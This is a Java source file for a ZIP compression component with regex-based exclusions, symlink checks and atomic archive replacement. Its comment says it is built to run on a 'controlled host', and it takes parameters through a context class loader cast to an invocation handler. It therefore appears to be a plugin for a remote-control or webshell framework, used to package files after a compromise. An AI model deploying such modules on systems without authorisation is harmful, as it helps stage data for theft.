package org.leo.core.component;

import java.io.*;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * 文件压缩组件
 * 提供跨平台的ZIP文件压缩功能，支持正则表达式排除文件
 * 设计为在被控主机上稳定执行，兼容Java 6+
 *
 * @author LeoSpring
 * @version 2.3
 */
public class CompressComponent implements Runnable {

    // 缓冲区大小
    private static final int BUFFER_SIZE = 8192;

    private Map<String, Object> params;
    private HashMap<String, Object> results;

    // 排除模式（正则表达式）
    private Pattern excludePattern;
    private String sourceRootCanonical;
    private String destinationCanonical;
    private String temporaryCanonical;
    private HashSet<String> visitedDirectories;

    @Override
    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            Object request = h.invoke(null, null, null);
            params = request instanceof Map ? (Map<String, Object>) request : new HashMap<String, Object>();
            results = new HashMap<String, Object>();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new HashMap<String, Object>();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }

    /**
     * 压缩文件或目录（ZIP格式）
     */
    public void compress(String sourcePath, String zipFile, String excludePattern) throws IOException {
        File sourceFile = new File(sourcePath);

        // 验证源文件是否存在
        if (!sourceFile.exists()) {
            throw new IOException("源文件或目录不存在: " + sourcePath);
        }

        // 验证目标路径
        File zipFileObj = new File(zipFile);
        File absoluteTarget = zipFileObj.getAbsoluteFile();
        File canonicalParent = absoluteTarget.getParentFile().getCanonicalFile();
        if (!new File(canonicalParent, absoluteTarget.getName()).equals(absoluteTarget.getCanonicalFile())) {
            throw new IOException("目标 ZIP 不能是符号链接");
        }
        String sourceCanonical = sourceFile.getCanonicalPath();
        destinationCanonical = zipFileObj.getCanonicalPath();
        if (sourceCanonical.equals(destinationCanonical)) {
            throw new IOException("源文件与目标 ZIP 不能是同一路径");
        }
        File parentDir = zipFileObj.getParentFile();
        if (parentDir != null && !parentDir.exists()) {
            if (!parentDir.mkdirs()) {
                throw new IOException("无法创建目标目录: " + parentDir.getAbsolutePath());
            }
        }

        // 初始化排除模式
        initializeExcludePattern(excludePattern);
        File sourceRoot = sourceFile.isDirectory() ? sourceFile : sourceFile.getParentFile();
        sourceRootCanonical = sourceRoot == null ? null : sourceRoot.getCanonicalPath();
        visitedDirectories = new HashSet<String>();

        File temporary = File.createTempFile(".leo-compress-", ".tmp", zipFileObj.getAbsoluteFile().getParentFile());
        temporaryCanonical = temporary.getCanonicalPath();
        ZipOutputStream zos = null;
        boolean committed = false;
        try {
            zos = new ZipOutputStream(new FileOutputStream(temporary));
            if (sourceFile.isDirectory()) {
                compressDirectory(sourceFile, sourceFile.getName(), zos);
            } else if (!shouldExclude(sourceFile, sourceFile.getName())) {
                compressFile(sourceFile, zos, "");
            }
            // ZIP 中央目录在 close 时写入，关闭失败也不能提交目标文件。
            zos.close();
            zos = null;
            replaceArchive(temporary, zipFileObj);
            committed = true;
        } finally {
            closeStream(zos);
            if (!committed) temporary.delete();
        }

        results.put("code", 200);
        results.put("msg", "ZIP压缩完成: " + sourcePath + " -> " + zipFile);
        results.put("sourcePath", sourcePath);
        results.put("zipFile", zipFile);
        results.put("format", "zip");
    }

    private void replaceArchive(File temporary, File target) throws IOException {
        File backup = null;
        if (target.exists()) {
            if (!target.isFile()) throw new IOException("目标不是普通文件: " + target);
            preservePermissions(target, temporary);
            backup = File.createTempFile(".leo-compress-backup-", ".tmp", target.getAbsoluteFile().getParentFile());
            if (!backup.delete() || !target.renameTo(backup)) {
                throw new IOException("无法备份原归档: " + target);
            }
        }
        if (!temporary.renameTo(target)) {
            if (backup != null && !backup.renameTo(target)) {
                throw new IOException("归档提交失败，原文件保留于: " + backup);
            }
            throw new IOException("无法提交归档: " + target);
        }
        if (backup != null && !backup.delete()) backup.deleteOnExit();
    }

    private void preservePermissions(File source, File temporary) throws IOException {
        try {
            Class filesClass = Class.forName("java.nio.file.Files");
            Class pathClass = Class.forName("java.nio.file.Path");
            Class optionClass = Class.forName("java.nio.file.LinkOption");
            Object options = java.lang.reflect.Array.newInstance(optionClass, 0);
            Object sourcePath = File.class.getMethod("toPath", new Class[0]).invoke(source, new Object[0]);
            Object temporaryPath = File.class.getMethod("toPath", new Class[0]).invoke(temporary, new Object[0]);
            Object permissions = filesClass.getMethod("getPosixFilePermissions", new Class[]{pathClass, options.getClass()})
                    .invoke(null, new Object[]{sourcePath, options});
            filesClass.getMethod("setPosixFilePermissions", new Class[]{pathClass, java.util.Set.class})
                    .invoke(null, new Object[]{temporaryPath, permissions});
            return;
        } catch (java.lang.reflect.InvocationTargetException error) {
            if (error.getCause() instanceof UnsupportedOperationException) return; // 非 POSIX 文件系统使用目录继承权限。
            throw new IOException("无法保留归档权限: " + error.getCause());
        } catch (ClassNotFoundException legacyJvm) {
            // Java 6 无精确 POSIX 权限 API，限制为当前用户，避免扩大原归档访问范围。
        } catch (Exception error) {
            throw new IOException("无法保留归档权限: " + error);
        }
        if (!temporary.setReadable(false, false) || !temporary.setWritable(false, false)
                || !temporary.setExecutable(false, false)
                || !temporary.setReadable(source.canRead(), true) || !temporary.setWritable(source.canWrite(), true)
                || !temporary.setExecutable(source.canExecute(), true)) {
            throw new IOException("无法设置归档权限");
        }
    }

    /**
     * 递归压缩目录（ZIP格式）
     */
    private void compressDirectory(File folder, String parentFolder, ZipOutputStream zos) throws IOException {
        String canonical = folder.getCanonicalPath();
        if (!visitedDirectories.add(canonical)) return;
        zos.putNextEntry(new ZipEntry(parentFolder + "/"));
        zos.closeEntry();
        File[] files = folder.listFiles();
        if (files == null) return;
        for (File file : files) {
            String entryPath = parentFolder + "/" + file.getName();
            if (shouldExclude(file, entryPath)) continue;
            if (file.isDirectory()) {
                compressDirectory(file, entryPath, zos);
            } else {
                compressFile(file, zos, parentFolder + "/");
            }
        }
    }

    /**
     * 压缩单个文件（ZIP格式）
     */
    private void compressFile(File file, ZipOutputStream zos, String parentFolder) throws IOException {
        FileInputStream fis = new FileInputStream(file);
        try {
            ZipEntry zipEntry = new ZipEntry(parentFolder + file.getName());
            zos.putNextEntry(zipEntry);

            byte[] buffer = new byte[BUFFER_SIZE];
            int length;
            while ((length = fis.read(buffer)) > 0) {
                zos.write(buffer, 0, length);
            }
            zos.closeEntry();
        } finally {
            closeStream(fis);
        }
    }

    /**
     * 初始化排除模式（正则表达式）
     */
    private void initializeExcludePattern(String excludePatternStr) {
        excludePattern = null;
        if (excludePatternStr != null && !excludePatternStr.trim().isEmpty()) {
            try {
                excludePattern = Pattern.compile(excludePatternStr.trim(), Pattern.CASE_INSENSITIVE);
            } catch (Exception e) {
                // 忽略无效的正则表达式
            }
        }
    }

    /**
     * 检查文件或目录是否应该被排除
     * @param file 文件对象
     * @param entryPath ZIP条目路径
     * @return true表示应该排除，false表示应该包含
     */
    private boolean shouldExclude(File file, String entryPath) {
        // 标准化路径（使用正斜杠）
        String normalizedPath = entryPath.replace("\\", "/");

        // 获取相对于源根目录的路径
        String relativePath = normalizedPath;
        try {
            if (sourceRootCanonical != null) {
                String filePath = file.getCanonicalPath();
                if (filePath.equals(destinationCanonical) || filePath.equals(temporaryCanonical)) {
                    return true;
                }
                String rootPath = sourceRootCanonical;
                if (!filePath.equals(rootPath)
                        && !filePath.startsWith(rootPath + File.separator)) {
                    return true;
                }
                relativePath = filePath.substring(rootPath.length());
                if (relativePath.startsWith(File.separator)) {
                    relativePath = relativePath.substring(1);
                }
                relativePath = relativePath.replace("\\", "/");
            }
        } catch (IOException e) {
            // 使用标准化路径
        }

        // 匹配完整路径或文件名
        return excludePattern != null && (excludePattern.matcher(relativePath).matches()
            || excludePattern.matcher(normalizedPath).matches()
            || excludePattern.matcher(file.getName()).matches());
    }

    private void closeStream(Closeable stream) {
        if (stream == null) return;
        try { stream.close(); } catch (IOException ignored) {}
    }

    /**
     * 主执行方法
     */
    public void invoke() throws Exception {
        String src = pathParam("src");
        String des = pathParam("des");

        Object excludeObj = params.get("exclude");
        String excludePattern = excludeObj instanceof String ? (String) excludeObj : null;

        try {
            compress(src, des, excludePattern);
        } catch (Exception e) {
            results.put("code",500);
            results.put("msg", e.getMessage());
        }
    }

    private String pathParam(String name) throws IOException {
        Object value = params.get(name);
        if (value instanceof String) return (String) value;
        if (value instanceof byte[]) return new String((byte[]) value, "UTF-8");
        throw new IllegalArgumentException(name + " 必须是文本路径");
    }
}
